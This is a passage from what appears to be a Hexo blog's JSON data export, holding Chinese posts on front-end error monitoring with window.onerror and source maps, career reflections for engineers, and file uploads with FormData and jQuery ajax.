Error</h3><blockquote>\n<p>现在我们一般都把资源放在 cdn 上，其他资源在本页面相当于跨域为什么会有这种设置，这是避免数据泄露到不安全的域中。如果我是银行页面，随便引入一个 js 资源，读取了账户密码，那可如何是好。</p>\n</blockquote>\n<h4 id=\"解决手段\"><a href=\"#解决手段\" class=\"headerlink\" title=\"解决手段\"></a>解决手段</h4><p>添加信任的域</p>\n<ul>\n<li>客户端的 script 添加 crossorigin，他的作用就是告诉浏览器，要加载一个其他域的资源，并且信任他</li>\n<li>服务端设置<strong>Acess-Control-Allow-Origin</strong>的响应头，可以直接设置为*，信任全部资源。cdn 资源应该全部加上 CORS 响应头。<blockquote>\n<p>如果我们使用 nginx 的话，可以像下面那样简单配置</p>\n</blockquote>\n</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location / &#123;</span><br><span class=\"line\">     root /Users<span class=\"comment\">/**;</span></span><br><span class=\"line\"><span class=\"comment\">     index  index.html index.htm;</span></span><br><span class=\"line\"><span class=\"comment\">     add_header \"Access-Control-Allow-Origin\" \"*\";</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"代码压缩\"><a href=\"#代码压缩\" class=\"headerlink\" title=\"代码压缩\"></a>代码压缩</h3><blockquote>\n<p>现代 web 工程都会直接压缩 js 代码，所以线上一般都是只有几行代码但是我们有 sourcemap，可以定位到源代码的位置。但是线上是没有这个东西，我们可以通过<a href=\"https://github.com/mozilla/source-map/\" target=\"_blank\" rel=\"noopener\">sourcemap</a>这个工具来将压缩后的代码生成 sourcemap</p>\n</blockquote>\n<ul>\n<li>这里简单介绍一下生成 sourcemap 文件的方式</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uglifyjs --source-map 最终生成的map名称 --output 压缩文件名称 原文件名称</span><br></pre></td></tr></table></figure>\n<ul>\n<li>简单通过 soucemap 定位到源文件的真正行数</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> sourceMap = <span class=\"built_in\">require</span>(<span class=\"string\">\"source-map\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> mapData = <span class=\"built_in\">require</span>(<span class=\"string\">\"./test.json\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> consumer = <span class=\"keyword\">new</span> sourceMap.SourceMapConsumer(mapData);</span><br><span class=\"line\"><span class=\"keyword\">let</span> info = consumer.originalPositionFor(&#123; <span class=\"attr\">line</span>: <span class=\"number\">1</span>, <span class=\"attr\">column</span>: <span class=\"number\">102</span> &#125;);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(info); <span class=\"comment\">//&#123; source: \"test.js\", line: 11, column: 6, name: \"yoki\" &#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"推荐工具\"><a href=\"#推荐工具\" class=\"headerlink\" title=\"推荐工具\"></a>推荐工具</h2><blockquote>\n<p>由以上可以简单知道前端收集的原理了，但真正到线上肯定是不够的，这里有一些成熟的工具</p>\n</blockquote>\n<ul>\n<li><a href=\"https://sentry.io\" target=\"_blank\" rel=\"noopener\">sentry</a></li>\n<li><a href=\"https://www.fundebug.com/\" target=\"_blank\" rel=\"noopener\">fundebug</a></li>\n</ul>\n<hr>\n<blockquote>\n<p>分享一篇干货<a href=\"http://web.jobbole.com/90033/\" target=\"_blank\" rel=\"noopener\">如何设计一个前端监控系统</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"为什么要进行前端的错误进行监控\"><a href=\"#为什么要进行前端的错误进行监控\" class=\"headerlink\" title=\"为什么要进行前端的错误进行监控\"></a>为什么要进行前端的错误进行监控</h2><ul>\n<li>现在网页的要求已经趋近于原生的应用，几乎都是有着大量交互的。面对各种用户，不同的浏览器等等出现的不同问题，有必要进行及时的监控，毕竟有些问题复现也是挺困难的。</li>\n</ul>\n<h2 id=\"捕获错误的方法\"><a href=\"#捕获错误的方法\" class=\"headerlink\" title=\"捕获错误的方法\"></a>捕获错误的方法</h2><ul>\n<li>try..catch 之前说过，但是它只能在 try 的块里运行才可以捕捉错误，无法捕捉全局的错误事件</li>\n<li>window.onerror 可以用来捕捉全局的错误,但是它无法捕捉异步错误，我们在 ajax 模块统一埋点</li>\n</ul>\n<h3 id=\"window-onerror\"><a href=\"#window-onerror\" class=\"headerlink\" title=\"window.onerror\"></a>window.onerror</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">window</span>.onerror=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">message,url,linNo,columnNo,error</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">message</span>:错误信息</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">url</span>:发生错误对应的脚本路径，比如是<span class=\"title\">bundle</span>.<span class=\"title\">js</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">lineNo</span>:错误发生的行号</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">colunmnNo</span>:错误发生的列号</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">error</span>：具体的<span class=\"title\">error</span>对象，包含更加详细的错误调用堆栈信息</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"常见问题\"><a href=\"#常见问题\" class=\"headerlink\" title=\"常见问题\"></a>常见问题</h2><h3 id=\"Script-Error\"><a href=\"#Script-Error\" class=\"headerlink\" title=\"Script Error\"></a>Script Error</h3><blockquote>\n<p>现在我们一般都把资源放在 cdn 上，其他资源在本页面相当于跨域为什么会有这种设置，这是避免数据泄露到不安全的域中。如果我是银行页面，随便引入一个 js 资源，读取了账户密码，那可如何是好。</p>\n</blockquote>\n<h4 id=\"解决手段\"><a href=\"#解决手段\" class=\"headerlink\" title=\"解决手段\"></a>解决手段</h4><p>添加信任的域</p>\n<ul>\n<li>客户端的 script 添加 crossorigin，他的作用就是告诉浏览器，要加载一个其他域的资源，并且信任他</li>\n<li>服务端设置<strong>Acess-Control-Allow-Origin</strong>的响应头，可以直接设置为*，信任全部资源。cdn 资源应该全部加上 CORS 响应头。<blockquote>\n<p>如果我们使用 nginx 的话，可以像下面那样简单配置</p>\n</blockquote>\n</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location / &#123;</span><br><span class=\"line\">     root /Users<span class=\"comment\">/**;</span></span><br><span class=\"line\"><span class=\"comment\">     index  index.html index.htm;</span></span><br><span class=\"line\"><span class=\"comment\">     add_header \"Access-Control-Allow-Origin\" \"*\";</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"代码压缩\"><a href=\"#代码压缩\" class=\"headerlink\" title=\"代码压缩\"></a>代码压缩</h3><blockquote>\n<p>现代 web 工程都会直接压缩 js 代码，所以线上一般都是只有几行代码但是我们有 sourcemap，可以定位到源代码的位置。但是线上是没有这个东西，我们可以通过<a href=\"https://github.com/mozilla/source-map/\" target=\"_blank\" rel=\"noopener\">sourcemap</a>这个工具来将压缩后的代码生成 sourcemap</p>\n</blockquote>\n<ul>\n<li>这里简单介绍一下生成 sourcemap 文件的方式</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uglifyjs --source-map 最终生成的map名称 --output 压缩文件名称 原文件名称</span><br></pre></td></tr></table></figure>\n<ul>\n<li>简单通过 soucemap 定位到源文件的真正行数</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> sourceMap = <span class=\"built_in\">require</span>(<span class=\"string\">\"source-map\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> mapData = <span class=\"built_in\">require</span>(<span class=\"string\">\"./test.json\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">let</span> consumer = <span class=\"keyword\">new</span> sourceMap.SourceMapConsumer(mapData);</span><br><span class=\"line\"><span class=\"keyword\">let</span> info = consumer.originalPositionFor(&#123; <span class=\"attr\">line</span>: <span class=\"number\">1</span>, <span class=\"attr\">column</span>: <span class=\"number\">102</span> &#125;);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(info); <span class=\"comment\">//&#123; source: \"test.js\", line: 11, column: 6, name: \"yoki\" &#125;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"推荐工具\"><a href=\"#推荐工具\" class=\"headerlink\" title=\"推荐工具\"></a>推荐工具</h2><blockquote>\n<p>由以上可以简单知道前端收集的原理了，但真正到线上肯定是不够的，这里有一些成熟的工具</p>\n</blockquote>\n<ul>\n<li><a href=\"https://sentry.io\" target=\"_blank\" rel=\"noopener\">sentry</a></li>\n<li><a href=\"https://www.fundebug.com/\" target=\"_blank\" rel=\"noopener\">fundebug</a></li>\n</ul>\n<hr>\n<blockquote>\n<p>分享一篇干货<a href=\"http://web.jobbole.com/90033/\" target=\"_blank\" rel=\"noopener\">如何设计一个前端监控系统</a></p>\n</blockquote>\n"},{"title":"前端工程师的儒家修养","date":"2019-02-26T15:34:49.000Z","_content":"\n## 技术路线怎么走\n\n> 到高级阶段之后，其实已经不分前后端了。因为前后端领域的互通之处会越来越多。\n\n- 初级前后端\n- 中级前后端\n- 高级程序员\n- 技术专家/架构师\n\n## 技术人员的能力模型\n\n> 技能是看得到的部分，当你和一些资深开发人员接触时，往往能直观感受到的是技能。但是他们真正资深的原因，在于眼界、思维和心态（看不到的部分）。\n\n#### 技能\n\n#### 眼界\n\n- 思考职业规划\n- 抬高视角，不要过分沉迷具体技术，纷繁技术的背后是对称和统一\n- 多出去走走\n- 好奇心是技术进步的原动力。\n- 如果你是个资深程序员，去看看 Java 世界、Go 的世界、Python 的世界。\n\n#### 思维\n\n###### 对软件的思考\n\n- 软件的本质，是对现实的的建模\n  - 历史数据+发展规律=预测未来\n  - 软件的变化本质是现实世界的变化\n  - 思考为什么我们能对现实世界建模？\n- 软件的挑战，来自于应对世界的变化\n  - 为应对变化，我值得提前投入吗，投入多少？\n\n###### 理解世界\n\n- 抽象\n  - 世界变化很快，但事物的本质是稳定的\n  - 为什么要抽象，以不变应万变\n- 分层\n  - 当我们听歌的时候，不会关心电是怎么来的\n\n#### 心态\n\n- 认定方向，勇敢前进\n- 大气一点，对手不在眼前，技术进步那么快\n\n## 35 岁危机\n\n> 中年危机\n\n#### 35 岁的危机来自 25 岁的迷茫\n\n- 尽早投资自己，多看书，多学一个技能如做饭\n- 给予时间与自由，比给钱有用\n- 给能者多一些挑战而不是能者多劳\n","source":"_posts/geek-self-cultivation.md","raw":"---\ntitle: 前端工程师的儒家修养\ndate: 2019-02-26 23:34:49\ntags: 生活随想\n---\n\n## 技术路线怎么走\n\n> 到高级阶段之后，其实已经不分前后端了。因为前后端领域的互通之处会越来越多。\n\n- 初级前后端\n- 中级前后端\n- 高级程序员\n- 技术专家/架构师\n\n## 技术人员的能力模型\n\n> 技能是看得到的部分，当你和一些资深开发人员接触时，往往能直观感受到的是技能。但是他们真正资深的原因，在于眼界、思维和心态（看不到的部分）。\n\n#### 技能\n\n#### 眼界\n\n- 思考职业规划\n- 抬高视角，不要过分沉迷具体技术，纷繁技术的背后是对称和统一\n- 多出去走走\n- 好奇心是技术进步的原动力。\n- 如果你是个资深程序员，去看看 Java 世界、Go 的世界、Python 的世界。\n\n#### 思维\n\n###### 对软件的思考\n\n- 软件的本质，是对现实的的建模\n  - 历史数据+发展规律=预测未来\n  - 软件的变化本质是现实世界的变化\n  - 思考为什么我们能对现实世界建模？\n- 软件的挑战，来自于应对世界的变化\n  - 为应对变化，我值得提前投入吗，投入多少？\n\n###### 理解世界\n\n- 抽象\n  - 世界变化很快，但事物的本质是稳定的\n  - 为什么要抽象，以不变应万变\n- 分层\n  - 当我们听歌的时候，不会关心电是怎么来的\n\n#### 心态\n\n- 认定方向，勇敢前进\n- 大气一点，对手不在眼前，技术进步那么快\n\n## 35 岁危机\n\n> 中年危机\n\n#### 35 岁的危机来自 25 岁的迷茫\n\n- 尽早投资自己，多看书，多学一个技能如做饭\n- 给予时间与自由，比给钱有用\n- 给能者多一些挑战而不是能者多劳\n","slug":"geek-self-cultivation","published":1,"updated":"2019-02-26T16:43:21.888Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034ju000j0iofcbjwbctl","content":"<h2 id=\"技术路线怎么走\"><a href=\"#技术路线怎么走\" class=\"headerlink\" title=\"技术路线怎么走\"></a>技术路线怎么走</h2><blockquote>\n<p>到高级阶段之后，其实已经不分前后端了。因为前后端领域的互通之处会越来越多。</p>\n</blockquote>\n<ul>\n<li>初级前后端</li>\n<li>中级前后端</li>\n<li>高级程序员</li>\n<li>技术专家/架构师</li>\n</ul>\n<h2 id=\"技术人员的能力模型\"><a href=\"#技术人员的能力模型\" class=\"headerlink\" title=\"技术人员的能力模型\"></a>技术人员的能力模型</h2><blockquote>\n<p>技能是看得到的部分，当你和一些资深开发人员接触时，往往能直观感受到的是技能。但是他们真正资深的原因，在于眼界、思维和心态（看不到的部分）。</p>\n</blockquote>\n<h4 id=\"技能\"><a href=\"#技能\" class=\"headerlink\" title=\"技能\"></a>技能</h4><h4 id=\"眼界\"><a href=\"#眼界\" class=\"headerlink\" title=\"眼界\"></a>眼界</h4><ul>\n<li>思考职业规划</li>\n<li>抬高视角，不要过分沉迷具体技术，纷繁技术的背后是对称和统一</li>\n<li>多出去走走</li>\n<li>好奇心是技术进步的原动力。</li>\n<li>如果你是个资深程序员，去看看 Java 世界、Go 的世界、Python 的世界。</li>\n</ul>\n<h4 id=\"思维\"><a href=\"#思维\" class=\"headerlink\" title=\"思维\"></a>思维</h4><h6 id=\"对软件的思考\"><a href=\"#对软件的思考\" class=\"headerlink\" title=\"对软件的思考\"></a>对软件的思考</h6><ul>\n<li>软件的本质，是对现实的的建模<ul>\n<li>历史数据+发展规律=预测未来</li>\n<li>软件的变化本质是现实世界的变化</li>\n<li>思考为什么我们能对现实世界建模？</li>\n</ul>\n</li>\n<li>软件的挑战，来自于应对世界的变化<ul>\n<li>为应对变化，我值得提前投入吗，投入多少？</li>\n</ul>\n</li>\n</ul>\n<h6 id=\"理解世界\"><a href=\"#理解世界\" class=\"headerlink\" title=\"理解世界\"></a>理解世界</h6><ul>\n<li>抽象<ul>\n<li>世界变化很快，但事物的本质是稳定的</li>\n<li>为什么要抽象，以不变应万变</li>\n</ul>\n</li>\n<li>分层<ul>\n<li>当我们听歌的时候，不会关心电是怎么来的</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"心态\"><a href=\"#心态\" class=\"headerlink\" title=\"心态\"></a>心态</h4><ul>\n<li>认定方向，勇敢前进</li>\n<li>大气一点，对手不在眼前，技术进步那么快</li>\n</ul>\n<h2 id=\"35-岁危机\"><a href=\"#35-岁危机\" class=\"headerlink\" title=\"35 岁危机\"></a>35 岁危机</h2><blockquote>\n<p>中年危机</p>\n</blockquote>\n<h4 id=\"35-岁的危机来自-25-岁的迷茫\"><a href=\"#35-岁的危机来自-25-岁的迷茫\" class=\"headerlink\" title=\"35 岁的危机来自 25 岁的迷茫\"></a>35 岁的危机来自 25 岁的迷茫</h4><ul>\n<li>尽早投资自己，多看书，多学一个技能如做饭</li>\n<li>给予时间与自由，比给钱有用</li>\n<li>给能者多一些挑战而不是能者多劳</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"技术路线怎么走\"><a href=\"#技术路线怎么走\" class=\"headerlink\" title=\"技术路线怎么走\"></a>技术路线怎么走</h2><blockquote>\n<p>到高级阶段之后，其实已经不分前后端了。因为前后端领域的互通之处会越来越多。</p>\n</blockquote>\n<ul>\n<li>初级前后端</li>\n<li>中级前后端</li>\n<li>高级程序员</li>\n<li>技术专家/架构师</li>\n</ul>\n<h2 id=\"技术人员的能力模型\"><a href=\"#技术人员的能力模型\" class=\"headerlink\" title=\"技术人员的能力模型\"></a>技术人员的能力模型</h2><blockquote>\n<p>技能是看得到的部分，当你和一些资深开发人员接触时，往往能直观感受到的是技能。但是他们真正资深的原因，在于眼界、思维和心态（看不到的部分）。</p>\n</blockquote>\n<h4 id=\"技能\"><a href=\"#技能\" class=\"headerlink\" title=\"技能\"></a>技能</h4><h4 id=\"眼界\"><a href=\"#眼界\" class=\"headerlink\" title=\"眼界\"></a>眼界</h4><ul>\n<li>思考职业规划</li>\n<li>抬高视角，不要过分沉迷具体技术，纷繁技术的背后是对称和统一</li>\n<li>多出去走走</li>\n<li>好奇心是技术进步的原动力。</li>\n<li>如果你是个资深程序员，去看看 Java 世界、Go 的世界、Python 的世界。</li>\n</ul>\n<h4 id=\"思维\"><a href=\"#思维\" class=\"headerlink\" title=\"思维\"></a>思维</h4><h6 id=\"对软件的思考\"><a href=\"#对软件的思考\" class=\"headerlink\" title=\"对软件的思考\"></a>对软件的思考</h6><ul>\n<li>软件的本质，是对现实的的建模<ul>\n<li>历史数据+发展规律=预测未来</li>\n<li>软件的变化本质是现实世界的变化</li>\n<li>思考为什么我们能对现实世界建模？</li>\n</ul>\n</li>\n<li>软件的挑战，来自于应对世界的变化<ul>\n<li>为应对变化，我值得提前投入吗，投入多少？</li>\n</ul>\n</li>\n</ul>\n<h6 id=\"理解世界\"><a href=\"#理解世界\" class=\"headerlink\" title=\"理解世界\"></a>理解世界</h6><ul>\n<li>抽象<ul>\n<li>世界变化很快，但事物的本质是稳定的</li>\n<li>为什么要抽象，以不变应万变</li>\n</ul>\n</li>\n<li>分层<ul>\n<li>当我们听歌的时候，不会关心电是怎么来的</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"心态\"><a href=\"#心态\" class=\"headerlink\" title=\"心态\"></a>心态</h4><ul>\n<li>认定方向，勇敢前进</li>\n<li>大气一点，对手不在眼前，技术进步那么快</li>\n</ul>\n<h2 id=\"35-岁危机\"><a href=\"#35-岁危机\" class=\"headerlink\" title=\"35 岁危机\"></a>35 岁危机</h2><blockquote>\n<p>中年危机</p>\n</blockquote>\n<h4 id=\"35-岁的危机来自-25-岁的迷茫\"><a href=\"#35-岁的危机来自-25-岁的迷茫\" class=\"headerlink\" title=\"35 岁的危机来自 25 岁的迷茫\"></a>35 岁的危机来自 25 岁的迷茫</h4><ul>\n<li>尽早投资自己，多看书，多学一个技能如做饭</li>\n<li>给予时间与自由，比给钱有用</li>\n<li>给能者多一些挑战而不是能者多劳</li>\n</ul>\n"},{"title":"ajax使用FormData对象上传文件","date":"2018-05-11T12:24:14.000Z","_content":"\n## 背景\n\n* 因为发现用 postman 很轻松的就可以选择 file 类型\n* 但是 ajax 直接 data 提交键值对却是报不合法的\n\n```javascript\n//报错的\nthis.$proxy({\n  url: \"/pgsls/kol/addExcel\",\n  type: \"post\",\n  data: {\n    brandId: \"1\",\n    type: \"1\",\n    file: file //文件类型\n  }\n});\n```\n\n## 解决方案\n\n* 因为要上传类型是文件（二进制数据，而 http 提供的基于文本的通信协议），所以请求头的 Content-Type 要改成 multipart/form-data(默认是 application/x-www-form-urlencoded)\n* input 的 file 类型可以通过 change 事件来获取 file 对象（event.target.files）\n\n### HTTP 请求实体\n\n> 每个字段由一段 boundary string 来分隔，浏览器保证该 boundary string 不与内容重复,因而 multipart/form-data 能够成功编码二进制数据\n\n```javascript\n------WebKitFormBoundaryWyjhf3VZMVeInmDe\nContent-Disposition: form-data; name=\"brandId\"\n\n0\n------WebKitFormBoundaryWyjhf3VZMVeInmDe\nContent-Disposition: form-data; name=\"type\"\n\n1\n------WebKitFormBoundaryWyjhf3VZMVeInmDe\nContent-Disposition: form-data; name=\"file\"; filename=\"test.xlsx\"\nContent-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet\n\n\n------WebKitFormBoundaryWyjhf3VZMVeInmDe--\n```\n\n* 说一下为什么这里文件只有文件名，没有文件路径？\n* 按照浏览器的安全策略，网页是不能获取到一个文件的完整路径。因为网页开发者可能从这个路径获取到其他信息，甚至发起攻击。\n\n### 实际发送\n\n```javascript\nlet formData = new FormData();\nformData.append(\"brandId\", this.dialog.selectBrand);\nformData.append(\"type\", this.dialog.selectType);\nformData.append(\"file\", this.dialog.file);\nreturn this.$proxy({\n  url: \"/pgsls/kol/addExcel\",\n  type: \"post\",\n  data: formData,\n  cache: false,\n  processData: false,\n  contentType: false\n});\n```\n\n##### cacah:false\n\n* cache 设为 false 可以禁止浏览器对该 URL（以及对应的 HTTP 方法）的缓存。 jQuery 通过为 URL 添加一个冗余参数来实现。\n* 该方法只对 GET 和 HEAD 起作用，然而 IE8 会缓存之前的 GET 结果来响应 POST 请求。 这里设置 cache: false 是为了兼容 IE8。\n\n##### contentType：false\n\n* jq 的 contentType 默认值是 application/x-www-form-urlencoded,因此传给 data 参数的对象会默认转换为 query string\n* 我们不需要 jq 做这个转换，否则会破坏掉 multipart/form-data 的编码格式。所以设置 false 来禁止 jq 的转换操作\n\n##### processData:false\n\n* jq 会将 data 对象转换为字符串来发送 http 请求，默认情况会用 application/x-www-form-urlencoded 编码转换\n* 我们设置 contentType:false 后该转换会失败。因此设置 processData:false 来禁止这个转换过程（相当于双层保险）\n* data 本来就是用 formData 编码好的数据，不需要进行字符串转换\n\n## 兼容性\n\n* 由于 formdata 对象是 XMLHttpRequest Level2 接口，需要 IE 10+, Firefox 4.0+, Chrome 7+, Safari 5+, Opera 12+\n* 低版本浏览器只能用 form 表单了\n","source":"_posts/form-data.md","raw":"---\ntitle: ajax使用FormData对象上传文件\ndate: 2018-05-11 20:24:14\ntags: javascript\n---\n\n## 背景\n\n* 因为发现用 postman 很轻松的就可以选择 file 类型\n* 但是 ajax 直接 data 提交键值对却是报不合法的\n\n```javascript\n//报错的\nthis.$proxy({\n  url: \"/pgsls/kol/addExcel\",\n  type: \"post\",\n  data: {\n    brandId: \"1\",\n    type: \"1\",\n    file: file //文件类型\n  }\n});\n```\n\n## 解决方案\n\n* 因为要上传类型是文件（二进制数据，而 http 提供的基于文本的通信协议），所以请求头的 Content-Type 要改成 multipart/form-data(默认是 application/x-www-form-urlencoded)\n* input 的 file 类型可以通过 change 事件来获取 file 对象（event.target.files）\n\n### HTTP 请求实体\n\n> 每个字段由一段 boundary string 来分隔，浏览器保证该 boundary string 不与内容重复,因而 multipart/form-data 能够成功编码二进制数据\n\n```javascript\n------WebKitFormBoundaryWyjhf3VZMVeInmDe\nContent-Disposition: form-data; name=\"brandId\"\n\n0\n------WebKitFormBoundaryWyjhf3VZMVeInmDe\nContent-Disposition: form-data; name=\"type\"\n\n1\n------WebKitFormBoundaryWyjhf3VZMVeInmDe\nContent-Disposition: form-data; name=\"file\"; filename=\"test.xlsx\"\nContent-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet\n\n\n------WebKitFormBoundaryWyjhf3VZMVeInmDe--\n```\n\n* 说一下为什么这里文件只有文件名，没有文件路径？\n* 按照浏览器的安全策略，网页是不能获取到一个文件的完整路径。因为网页开发者可能从这个路径获取到其他信息，甚至发起攻击。\n\n### 实际发送\n\n```javascript\nlet formData = new FormData();\nformData.append(\"brandId\", this.dialog.selectBrand);\nformData.append(\"type\", this.dialog.selectType);\nformData.append(\"file\", this.dialog.file);\nreturn this.$proxy({\n  url: \"/pgsls/kol/addExcel\",\n  type: \"post\",\n  data: formData,\n  cache: false,\n  processData: false,\n  contentType: false\n});\n```\n\n##### cacah:false\n\n* cache 设为 false 可以禁止浏览器对该 URL（以及对应的 HTTP 方法）的缓存。 jQuery 通过为 URL 添加一个冗余参数来实现。\n* 该方法只对 GET 和 HEAD 起作用，然而 IE8 会缓存之前的 GET 结果来响应 POST 请求。 这里设置 cache: false 是为了兼容 IE8。\n\n##### contentType：false\n\n* jq 的 contentType 默认值是 application/x-www-form-urlencoded,因此传给 data 参数的对象会默认转换为 query string\n* 我们不需要 jq 做这个转换，否则会破坏掉 multipart/form-data 的编码格式。所以设置 false 来禁止 jq 的转换操作\n\n##### processData:false\n\n* jq 会将 data 对象转换为字符串来发送 http 请求，默认情况会用 application/x-www-form-urlencoded 编码转换\n* 我们设置 contentType:false 后该转换会失败。因此设置 processData:false 来禁止这个转换过程（相当于双层保险）\n* data 本来就是用 formData 编码好的数据，不需要进行字符串转换\n\n## 兼容性\n\n* 由于 formdata 对象是 XMLHttpRequest Level2 接口，需要 IE 10+, Firefox 4.0+, Chrome 7+, Safari 5+, Opera 12+\n* 低版本浏览器只能用 form 表单了\n","slug":"form-data","published":1,"updated":"2018-05-11T13:31:57.192Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034jx000l0iofjb1w9sff","content":"<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><ul>\n<li>因为发现用 postman 很轻松的就可以选择 file 类型</li>\n<li>但是 ajax 直接 data 提交键值对却是报不合法的</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//报错的</span></span><br><span class=\"line\"><span class=\"keyword\">this</span>.$proxy(&#123;</span><br><span class=\"line\">  url: <span class=\"string\">\"/pgsls/kol/addExcel\"</span>,</span><br><span class=\"line\">  type: <span class=\"string\">\"post\"</span>,</span><br><span class=\"line\">  data: &#123;</span><br><span class=\"line\">    brandId: <span class=\"string\">\"1\"</span>,</span><br><span class=\"line\">    type: <span class=\"string\">\"1\"</span>,</span><br><span class=\"line\">    file: file <span class=\"comment\">//文件类型</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h2 id=\"解决方案\"><a href=\"#解决方案\" class=\"headerlink\" title=\"解决方案\"></a>解决方案</h2><ul>\n<li>因为要上传类型是文件（二进制数据，而 http 提供的基于文本的通信协议），所以请求头的 Content-Type 要改成 multipart/form-data(默认是 application/x-www-form-urlencoded)</li>\n<li>input 的 file 类型可以通过 change 事件来获取 file 对象（event.target.files）</li>\n</ul>\n<h3 id=\"HTTP-请求实体\"><a href=\"#HTTP-请求实体\" class=\"headerlink\" title=\"HTTP 请求实体\"></a>HTTP 请求实体</h3><blockquote>\n<p>每个字段由一段 boundary string 来分隔，浏览器保证该 boundary string 不与内容重复,因而 multipart/form-data 能够成功编码二进制数据</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">------WebKitFormBoundaryWyjhf3VZMVeInmDe</span><br><span class=\"line\">Content-Disposition: form-data; name=<span class=\"string\">\"brandId\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0</span></span><br><span class=\"line\">------WebKitFormBoundaryWyjhf3VZMVeInmDe</span><br><span class=\"line\">Content-Disposition: form-data; name=<span class=\"string\">\"type\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">1</span></span><br><span class=\"line\">------WebKitFormBoundaryWyjhf3VZMVeInmDe</span><br><span class=\"line\">Content-Disposition: form-data; name=<span class=\"string\">\"file\"</span>; filename=<span class=\"string\">\"test.xlsx\"</span></span><br><span class=\"line\">Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">------WebKitFormBoundaryWyjhf3VZMVeInmDe--</span><br></pre></td></tr></table></figure>\n<ul>\n<li>说一下为什么这里文件只有文件名，没有文件路径？</li>\n<li>按照浏览器的安全策略，网页是不能获取到一个文件的完整路径。因为网页开发者可能从这个路径获取到其他信息，甚至发起攻击。</li>\n</ul>\n<h3 id=\"实际发送\"><a href=\"#实际发送\" class=\"headerlink\" title=\"实际发送\"></a>实际发送</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 